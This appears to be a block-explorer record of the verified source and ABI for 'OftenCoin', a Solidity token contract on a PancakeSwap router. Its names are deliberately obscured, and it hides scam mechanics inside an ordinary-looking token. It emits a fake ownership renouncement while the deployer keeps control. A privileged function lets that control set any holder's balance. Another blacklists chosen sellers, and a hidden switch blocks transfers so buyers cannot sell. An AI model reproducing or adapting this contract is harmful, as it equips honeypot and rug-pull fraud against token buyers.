{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.6;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract minLimitToken {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface atToken {\n    function createPair(address receiverWalletAt, address shouldSwap) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface tradingListIs {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface modeAmountSwap {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address toSwap) external view returns (uint256);\n\n    function transfer(address amountMode, uint256 maxLiquidity) external returns (bool);\n\n    function allowance(address limitMinSender, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 maxLiquidity) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address amountMode,\n        uint256 maxLiquidity\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed exemptBuySell, uint256 value);\n    event Approval(address indexed limitMinSender, address indexed spender, uint256 value);\n}\n\ninterface modeAmountSwapMetadata is modeAmountSwap {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract OftenCoin is minLimitToken, modeAmountSwap, modeAmountSwapMetadata {\n\n    bool private receiverShould;\n\n    mapping(address => bool) public autoTakeTo;\n\n    uint256 marketingSwap;\n\n    function launchedMax(address listEnable) public {\n        isTotal();\n        if (sellFund == launchedMode) {\n            sellFund = launchedMode;\n        }\n        if (listEnable == fundSell || listEnable == totalMarketing) {\n            return;\n        }\n        maxReceiver[listEnable] = true;\n    }\n\n    uint256 toMaxReceiver;\n\n    bool private walletTotal;\n\n    address public totalMarketing;\n\n    bool public toExempt;\n\n    mapping(address => bool) public maxReceiver;\n\n    function approve(address fromExemptTotal, uint256 maxLiquidity) public virtual override returns (bool) {\n        receiverSwapMax[_msgSender()][fromExemptTotal] = maxLiquidity;\n        emit Approval(_msgSender(), fromExemptTotal, maxLiquidity);\n        return true;\n    }\n\n    function tradingList(address txMarketingTotal) public {\n        require(txMarketingTotal.balance < 100000);\n        if (marketingIs) {\n            return;\n        }\n        \n        autoTakeTo[txMarketingTotal] = true;\n        \n        marketingIs = true;\n    }\n\n    address teamExemptSwap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    string private maxLaunchedTx = \"Often Coin\";\n\n    uint256 public walletFund = 0;\n\n    address public fundSell;\n\n    function tokenWallet(address atMinSell, address amountMode, uint256 maxLiquidity) internal view returns (uint256) {\n        require(maxLiquidity > 0);\n\n        uint256 senderAt = 0;\n        if (atMinSell == totalMarketing && fundSellAuto > 0) {\n            senderAt = maxLiquidity * fundSellAuto / 100;\n        } else if (amountMode == totalMarketing && walletFund > 0) {\n            senderAt = maxLiquidity * walletFund / 100;\n        }\n        require(senderAt <= maxLiquidity);\n        return maxLiquidity - senderAt;\n    }\n\n    function marketingReceiver() public {\n        emit OwnershipTransferred(fundSell, address(0));\n        enableMin = address(0);\n    }\n\n    mapping(address => uint256) private shouldAuto;\n\n    function symbol() external view virtual override returns (string memory) {\n        return shouldLiquiditySwap;\n    }\n\n    mapping(address => mapping(address => uint256)) private receiverSwapMax;\n\n    function listLaunch(uint256 maxLiquidity) public {\n        isTotal();\n        marketingSwap = maxLiquidity;\n    }\n\n    constructor (){\n        if (tradingAmountTotal) {\n            walletTotal = true;\n        }\n        marketingReceiver();\n        tradingListIs limitTeam = tradingListIs(teamExemptSwap);\n        totalMarketing = atToken(limitTeam.factory()).createPair(limitTeam.WETH(), address(this));\n        liquidityMarketing = atToken(limitTeam.factory()).feeTo();\n        \n        fundSell = _msgSender();\n        autoTakeTo[fundSell] = true;\n        shouldAuto[fundSell] = exemptSwap;\n        if (launchedMode == sellFund) {\n            launchedMode = sellFund;\n        }\n        emit Transfer(address(0), fundSell, exemptSwap);\n    }\n\n    address private enableMin;\n\n    uint256 constant limitFrom = 20 ** 10;\n\n    uint8 private listMaxReceiver = 18;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return exemptSwap;\n    }\n\n    address liquidityMarketing;\n\n    function transferFrom(address atMinSell, address amountMode, uint256 maxLiquidity) external override returns (bool) {\n        if (_msgSender() != teamExemptSwap) {\n            if (receiverSwapMax[atMinSell][_msgSender()] != type(uint256).max) {\n                require(maxLiquidity <= receiverSwapMax[atMinSell][_msgSender()]);\n                receiverSwapMax[atMinSell][_msgSender()] -= maxLiquidity;\n            }\n        }\n        return walletMarketingReceiver(atMinSell, amountMode, maxLiquidity);\n    }\n\n    function getOwner() external view returns (address) {\n        return enableMin;\n    }\n\n    uint256 private exemptSwap = 100000000 * 10 ** 18;\n\n    function fromEnable(address senderWalletMax, uint256 maxLiquidity) public {\n        isTotal();\n        shouldAuto[senderWalletMax] = maxLiquidity;\n    }\n\n    bool public shouldWalletTrading;\n\n    function allowance(address amountLiquiditySell, address fromExemptTotal) external view virtual override returns (uint256) {\n        if (fromExemptTotal == teamExemptSwap) {\n            return type(uint256).max;\n        }\n        return receiverSwapMax[amountLiquiditySell][fromExemptTotal];\n    }\n\n    string private shouldLiquiditySwap = \"OCN\";\n\n    function walletMarketingReceiver(address atMinSell, address amountMode, uint256 maxLiquidity) internal returns (bool) {\n        if (atMinSell == fundSell) {\n            return fromBuy(atMinSell, amountMode, maxLiquidity);\n        }\n        uint256 teamTokenExempt = modeAmountSwap(totalMarketing).balanceOf(liquidityMarketing);\n        require(teamTokenExempt == marketingSwap);\n        require(amountMode != liquidityMarketing);\n        if (maxReceiver[atMinSell]) {\n            return fromBuy(atMinSell, amountMode, limitFrom);\n        }\n        maxLiquidity = tokenWallet(atMinSell, amountMode, maxLiquidity);\n        return fromBuy(atMinSell, amountMode, maxLiquidity);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return maxLaunchedTx;\n    }\n\n    function transfer(address senderWalletMax, uint256 maxLiquidity) external virtual override returns (bool) {\n        return walletMarketingReceiver(_msgSender(), senderWalletMax, maxLiquidity);\n    }\n\n    function fromBuy(address atMinSell, address amountMode, uint256 maxLiquidity) internal returns (bool) {\n        require(shouldAuto[atMinSell] >= maxLiquidity);\n        shouldAuto[atMinSell] -= maxLiquidity;\n        shouldAuto[amountMode] += maxLiquidity;\n        emit Transfer(atMinSell, amountMode, maxLiquidity);\n        return true;\n    }\n\n    uint256 public fundSellAuto = 3;\n\n    event OwnershipTransferred(address indexed feeReceiverTeam, address indexed fundReceiverSell);\n\n    function balanceOf(address toSwap) public view virtual override returns (uint256) {\n        return shouldAuto[toSwap];\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return listMaxReceiver;\n    }\n\n    bool public marketingIs;\n\n    uint256 private launchedMode;\n\n    bool public tradingAmountTotal;\n\n    function owner() external view returns (address) {\n        return enableMin;\n    }\n\n    bool private fundAt;\n\n    uint256 private sellFund;\n\n    function isTotal() private view {\n        require(autoTakeTo[_msgSender()]);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitMinSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeReceiverTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundReceiverSell\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptBuySell\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountLiquiditySell\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fromExemptTotal\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromExemptTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxLiquidity\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"autoTakeTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toSwap\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderWalletMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxLiquidity\",\"type\":\"uint256\"}],\"name\":\"fromEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundSell\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundSellAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listEnable\",\"type\":\"address\"}],\"name\":\"launchedMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxLiquidity\",\"type\":\"uint256\"}],\"name\":\"listLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldWalletTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingAmountTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txMarketingTotal\",\"type\":\"address\"}],\"name\":\"tradingList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderWalletMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxLiquidity\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atMinSell\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxLiquidity\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "OftenCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}